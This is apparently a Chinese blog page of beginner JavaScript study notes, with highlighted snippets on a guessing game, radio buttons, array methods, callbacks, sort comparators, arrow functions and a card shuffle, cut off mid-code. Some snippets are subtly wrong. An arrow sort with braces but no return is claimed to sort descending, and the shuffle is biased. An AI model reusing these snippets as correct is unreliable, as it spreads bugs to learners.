<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> num=<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">10</span>+<span class="number">1</span>);<span class="comment">//1-10</span></span><br><span class="line"><span class="keyword">let</span> guesscount=<span class="number">0</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mybutton&quot;</span>).<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> guess=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myinput&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    guesscount+=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(guess==num)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">`<span class="subst">$&#123;num&#125;</span> is the #. It took your <span class="subst">$&#123;guesscount&#125;</span> times!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(guess&lt;num)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;too small&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;too large&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>单选</strong></p>
<p>html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">id</span>=<span class="string">&quot;mylabel&quot;</span>&gt;</span>选择一个颜色<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;r1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;unit&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">label</span>&gt;</span>blue<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;r2&quot;</span> <span class="attr">name</span>=<span class="string">&quot;unit&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">label</span>&gt;</span>red<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;mybutton&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">label</span> <span class="attr">id</span>=<span class="string">&quot;templabel&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mybutton&quot;</span>).<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> res=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;templabel&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;r1&quot;</span>).<span class="property">checked</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        res.<span class="property">innerHTML</span>=<span class="string">&quot;你选了蓝色&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;r2&quot;</span>).<span class="property">checked</span>)&#123;</span><br><span class="line">        res.<span class="property">innerHTML</span>=<span class="string">&quot;你选了红的&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        res.<span class="property">innerHTML</span>=<span class="string">&quot;选一个吧&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>数组</strong></p>
<p>略，用到的时候再补</p>
<p><strong>排序sort</strong></p>
<p><strong>二维数组遍历</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p1=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">let</span> p2=[<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p=[p1,p2];</span><br><span class="line">p[<span class="number">0</span>][<span class="number">1</span>]=<span class="string">&quot;asd&quot;</span>; <span class="comment">//替换了b</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> list <span class="keyword">of</span> p)&#123;<span class="comment">//行</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> zm <span class="keyword">of</span> list)&#123;<span class="comment">//列</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(zm);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>展开运算符</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p1=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">let</span> p2=[<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//p1.push(p2);//会压缩p2内容  [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, Array(3)]</span></span><br><span class="line">p1.<span class="title function_">push</span>(...p2);<span class="comment">//[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1);</span><br></pre></td></tr></table></figure>

<p><strong>剩余参数</strong></p>
<p>解决参数拿不准的情况</p>
<p>比如一个函数是加和参数，但是不清楚参数个数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//剩余参数</span></span><br><span class="line"><span class="keyword">let</span> a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>,d=<span class="number">4</span>,e=<span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sum</span>(a,b,c,d,e));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">...nums</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> total=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> num <span class="keyword">of</span> nums)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`this is <span class="subst">$&#123;num&#125;</span>`</span>)</span><br><span class="line">        total+=num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>callback</strong></p>
<p>将 <strong>函数本身</strong> 作为一个参数传递给另一个函数</p>
<p>如果这样传，比较麻烦</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> out=<span class="title function_">sum</span>(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(out);</span><br><span class="line"><span class="title function_">passval</span>(out);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">passval</span>(<span class="params">n</span>)&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;templabel&quot;</span>).<span class="property">innerHTML</span>=n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//改进后，</span></span><br><span class="line"><span class="title function_">sum</span>(<span class="number">2</span>,<span class="number">3</span>,passval);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x,y,callback</span>)&#123;</span><br><span class="line">    <span class="title function_">callback</span>(x+y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">passval</span>(<span class="params">n</span>)&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;templabel&quot;</span>).<span class="property">innerHTML</span>=n;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>array.forEach()</strong></p>
<p>对数组<strong>元素</strong>进行操作</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array.<span class="title function_">forEach</span>(<span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">currentValue, index, array</span>)&#123;</span><br><span class="line">  <span class="comment">//处理逻辑</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*currentValue代表当前遍历到的元素，index代表当前元素的索引，array代表数组本身*/</span></span><br></pre></td></tr></table></figure>

<p>例子：让每个元素首字母大写</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr=[<span class="string">&quot;aliba&quot;</span>,<span class="string">&quot;niude&quot;</span>,<span class="string">&quot;hah&quot;</span>];</span><br><span class="line">arr.<span class="title function_">forEach</span>(daxie);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">daxie</span>(<span class="params">element,index,array</span>)&#123;</span><br><span class="line">    <span class="comment">// array[index]，数组的第index个元素</span></span><br><span class="line">    array[index]=element[<span class="number">0</span>].<span class="title function_">toUpperCase</span>()+element.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//substring(1)从字符串的第一个字符开始截取到完</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr);<span class="comment">//[&#x27;Aliba&#x27;, &#x27;Niude&#x27;, &#x27;Hah&#x27;]</span></span><br></pre></td></tr></table></figure>

<p><strong>array.map()</strong></p>
<p>返回一个新数组，数组中的元素为原始数组元素调用函数处理后的值</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">array.<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">currentValue,index,arr</span>), thisValue)</span><br><span class="line">thisValue可选</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> shuzi=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"><span class="keyword">let</span> squres=shuzi.<span class="title function_">map</span>(squre);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(squres);<span class="comment">//输出数组 [1, 4, 9, 16, 25]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">squre</span>(<span class="params">element</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">pow</span>(element,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">squres.<span class="title function_">forEach</span>(print);<span class="comment">//输出单个元素</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">print</span>(<span class="params">element</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(element);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>array.filter()</strong></p>
<p>创建一个新的数组，新数组中的元素是通过检查指定数组中符合条件的所有元素，没有符合的就空数组</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array.<span class="title function_">filter</span>(<span class="keyword">function</span>(<span class="params">currentValue,index,arr</span>), thisValue)</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> age=[<span class="number">18</span>,<span class="number">19</span>,<span class="number">25</span>,<span class="number">30</span>,<span class="number">45</span>,<span class="number">16</span>];</span><br><span class="line"><span class="keyword">let</span> ages=age.<span class="title function_">filter</span>(show);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ages);<span class="comment">//[25, 30, 45]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">show</span>(<span class="params">element</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(element&gt;<span class="number">20</span>) <span class="keyword">return</span> element;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>array.reduce</strong></p>
<p>将数组成一个单值</p>
<p>例子，加和为单值</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> list=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> lists=list.<span class="title function_">reduce</span>(check);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(lists);<span class="comment">//55</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">total,element</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> total+element;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>数组排序</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> nums=[<span class="number">1</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">11</span>];</span><br><span class="line"></span><br><span class="line">nums=nums.<span class="title function_">sort</span>(jiangxu);<span class="comment">//[11, 7, 6, 5, 3, 1]</span></span><br><span class="line">nums=nums.<span class="title function_">sort</span>(shengxu);<span class="comment">//[1, 3, 5, 6, 7, 11]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nums);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">jiangxu</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> y-x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shengxu</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> x-y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>函数表达式(匿名函数)</strong></p>
<p>就是指计数时的这种方式</p>
<p>没必要给函数创建唯一的名称，或者说是省略了造名字的过程</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dec&quot;</span>).<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">     count-=<span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mylabel&quot;</span>).<span class="property">innerHTML</span>=count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//而不是</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*dasda();</span></span><br><span class="line"><span class="comment">function dasda()&#123;</span></span><br><span class="line"><span class="comment">.......</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br></pre></td></tr></table></figure>

<p><strong>箭头函数(Lambda 函数)</strong></p>
<p>或者说紧凑函数，去掉了function，用**&#x3D;&gt;{}**</p>
<p>语句只有一句，可以省略**{}**</p>
<p>例1，无参或一个参数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这是传统的函数表达式</span></span><br><span class="line"><span class="keyword">const</span> greeting=<span class="keyword">function</span>(<span class="params">user</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`1232, is <span class="subst">$&#123;user&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">greeting</span>(<span class="string">&quot;bro&quot;</span>);<span class="comment">//1232, is bro</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//箭头函数呢</span></span><br><span class="line"> <span class="keyword">const</span> <span class="title function_">greeting</span>=(<span class="params">user</span>)=&gt;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`1232, is <span class="subst">$&#123;user&#125;</span>`</span>);</span><br><span class="line"><span class="title function_">greeting</span>(<span class="string">&quot;bro&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>例2-两个参数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传统</span></span><br><span class="line"><span class="keyword">const</span> func2=<span class="keyword">function</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">func2</span>(<span class="number">5</span>,<span class="number">8</span>));<span class="comment">//13</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//箭头</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">func2</span>=(<span class="params">x,y</span>)=&gt;x+y;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">func2</span>(<span class="number">5</span>,<span class="number">8</span>));<span class="comment">//13</span></span><br></pre></td></tr></table></figure>

<p>例3-排序</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">let</span> nums=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">nums= nums.<span class="title function_">sort</span>(des);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nums);<span class="comment">//[9, 7, 6, 4, 3, 2, 1]</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">des</span>(<span class="params">x,y</span>)&#123;<span class="comment">//倒序</span></span><br><span class="line">    <span class="keyword">return</span> y-x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nums.<span class="title function_">forEach</span>(print);<span class="comment">//单个打印</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">print</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//传统</span></span><br><span class="line"><span class="keyword">let</span> nums=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">nums= nums.<span class="title function_">sort</span>(<span class="keyword">function</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> y-x;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nums);<span class="comment">//[9, 7, 6, 4, 3, 2, 1]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nums.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">&#125;);<span class="comment">//单个打印</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//=&gt;</span></span><br><span class="line"><span class="keyword">let</span> nums=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">nums= nums.<span class="title function_">sort</span>(<span class="function">(<span class="params">x,y</span>)=&gt;</span>&#123;y-x;&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nums);<span class="comment">//[9, 7, 6, 4, 3, 2, 1]</span></span><br><span class="line"></span><br><span class="line">nums.<span class="title function_">forEach</span>(<span class="function">(<span class="params">e</span>)=&gt;</span>&#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(e);&#125;);<span class="comment">//单个打印</span></span><br><span class="line"><span class="comment">//花括号可以去掉</span></span><br></pre></td></tr></table></figure>

<p><strong>打乱数组</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> cards=[<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>];</span><br><span class="line"></span><br><span class="line">cards=<span class="title function_">shuffle</span>(cards);<span class="comment">//数组</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cards);<span class="comment">//每次运行都是打乱的</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shuffle</span>(<span class="params">array</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> currentindex=array.<span class="property">length</span>;<span class="comment">//从最后一张开始洗牌</span></span><br><span class="line">    <span class="keyword">while</span>(currentindex!=<span class="number">0</span>)<span class="comment">//洗到第一张为止</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> randomindex=<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*array.<span class="property">length</span>);</span><br><span class="line">        currentindex-=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> temp=array[currentindex];</span><br><span class="line">        array[currentindex]=array[randomindex];</span><br><span class="line">        array[randomindex]=temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//=&gt;</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">xipai</span>=(<span class="params">array</span>)=&gt;&#123;</span><br><span class="line">    <span class="keyword">let</span> currentindex=array.<span class="property">length</span>;<span class="comment">//从最后一张开始洗牌</span></span><br><span class="line">    <span class="keyword">while</span>(currentindex!=<span class="number">0</span>)<span class="comment">//洗到第一张为止</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> randomindex=<span class="title class_">Math</span>.<span 